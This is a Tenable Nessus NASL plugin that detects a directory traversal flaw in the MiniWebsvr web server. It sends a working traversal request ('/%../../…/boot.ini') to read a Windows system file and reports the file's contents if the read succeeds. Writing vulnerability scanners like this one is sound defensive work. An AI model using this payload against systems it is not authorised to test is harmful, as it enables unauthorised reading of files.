#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31345);
  script_version("$Revision: 1.5 $");

  script_bugtraq_id(23413);
  script_xref(name:"milw0rm", value:"5212");
  script_xref(name:"OSVDB", value:"50022");

  script_name(english:"MiniWebsvr GET Request Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running MiniWebsvr, a small web server. 

The version of MiniWebsvr running on the remote host fails to sanitize
request strings of directory traversal sequences, which allows an
unauthenticated attacker to read files outside the web server's
document directory." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);


# Make sure the banner looks like MiniWebsvr.
banner = get_http_banner(port:port);
if (!banner || "Server: MiniWebSvr/" >!< banner) exit(0);


# Try to exploit the issue.
file = "/%../../../../../../../../../../../../boot.ini";
req = http_get(item:file, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if looks like boot.ini.
if ("[boot loader]" >< res)
{
  if (report_verbosity)
  {
    report = string(
      "\n",
      "Here are the contents of the file '\\boot.ini' that Nessus was able to\n",
      "read from the remote host :\n",
      "\n",
      res
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
